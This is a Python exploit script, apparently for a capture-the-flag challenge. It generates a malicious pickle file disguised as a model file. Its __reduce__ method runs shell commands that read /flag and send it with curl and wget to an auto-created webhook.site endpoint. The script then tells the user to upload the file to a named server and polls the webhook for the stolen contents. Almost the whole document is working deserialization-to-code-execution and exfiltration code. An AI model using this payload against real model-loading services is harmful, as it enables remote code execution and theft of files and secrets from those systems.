import pickle
import sys
import requests
import time
import json
import os

# 1. Setup Webhook to receive the flag
print("[*] Setting up webhook...")
try:
    # Create a new webhook token
    resp = requests.post("https://webhook.site/token")
    data = resp.json()
    uuid = data['uuid']
    webhook_url = f"https://webhook.site/{uuid}"
    api_url = f"https://webhook.site/token/{uuid}/requests"
    print(f"[+] Webhook created: {webhook_url}")
except Exception as e:
    print(f"[-] Failed to create webhook: {e}")
    # Fallback to a prompt if automation fails
    webhook_url = input("Enter your webhook URL (e.g. from webhook.site): ").strip()
    uuid = webhook_url.split('/')[-1]
    api_url = f"https://webhook.site/token/{uuid}/requests"

# 2. Generate Payload
# We use multiple methods to exfiltrate the flag to ensure success.
# Method A: Curl post body
# Method B: Curl query param (in case POST is blocked)
# Method C: Copy to static (backup)
commands = [
    f"curl -X POST -d \"$(cat /flag)\" {webhook_url}",
    f"curl {webhook_url}?flag=$(cat /flag | base64 | tr -d '\\n')",
    f"wget --post-data=\"$(cat /flag)\" {webhook_url}",
    "cp /flag /app/static/flag.txt" # Guessing path
]
# Combine commands with ;
full_cmd = "; ".join(commands)

# Mock posix for Windows generation
if 'posix' not in sys.modules:
    from types import ModuleType
    sys.modules['posix'] = ModuleType('posix')

def system(cmd):
    pass

system.__module__ = 'posix'
system.__name__ = 'system'
system.__qualname__ = 'system'
sys.modules['posix'].system = system

class Evil(object):
    def __reduce__(self):
        return (system, (full_cmd,))

payload_path = "f:\\CTF\\CTF-wp\\LilacCTF\\Nailong\\nailong_exploit.pth"
with open(payload_path, 'wb') as f:
    pickle.dump(Evil(), f)

print(f"[+] Payload generated at: {payload_path}")
print(f"[*] Payload command: {full_cmd}")

# 3. User Instruction
print("\n" + "="*50)
print(f"ACTION REQUIRED: Upload '{payload_path}' to http://1.95.143.126:8501/")
print("Wait for the 'Security Scan' to finish and the model to load.")
print("="*50 + "\n")

# 4. Poll for results
print("[*] Waiting for flag on webhook...")
found_flag = False
for i in range(20): # Wait for 100 seconds
    try:
        # Check webhook requests
        r = requests.get(api_url)
        requests_list = r.json().get('data', [])
        
        for req in requests_list:
            # Check content
            content = req.get('content', '')
            query = req.get('query', {})
            
            # Simple heuristic for flag format (usually flag{...} or just checking if we got data)
            if 'flag{' in content:
                print(f"\n[!!!] FLAG FOUND in content: {content}")
                found_flag = True
                break
            if 'flag' in query:
                 # Decode base64 if needed but usually it's just text in query
                print(f"\n[!!!] FLAG FOUND in query: {query['flag']}")
                found_flag = True
                break
            # If we just got a post with content that looks like a flag
            if content and 'flag' in content: 
                 print(f"\n[!!!] FLAG FOUND in content: {content}")
                 found_flag = True
                 break
            # If the content is short and looks like a flag
            if len(content) > 0 and '{' in content and '}' in content:
                 print(f"\n[!!!] FLAG FOUND possible content: {content}")
                 found_flag = True
                 break

        if found_flag:
            break
            
        # Also check static file just in case
        try:
            r_static = requests.get("http://1.95.143.126:8501/static/flag.txt", timeout=2)
            if r_static.status_code == 200 and 'flag{' in r_static.text:
                print(f"\n[!!!] FLAG FOUND in static file: {r_static.text}")
                found_flag = True
                break
        except:
            pass
            
        time.sleep(5)
        sys.stdout.write('.')
        sys.stdout.flush()
    except Exception as e:
        print(f"Error polling: {e}")
        time.sleep(5)

if not found_flag:
    print("\n[-] Timed out waiting for flag. Please check the website manually.")
    print(f"Webhook URL to check: {webhook_url}")
    print("Static file URL to check: http://1.95.143.126:8501/static/flag.txt")
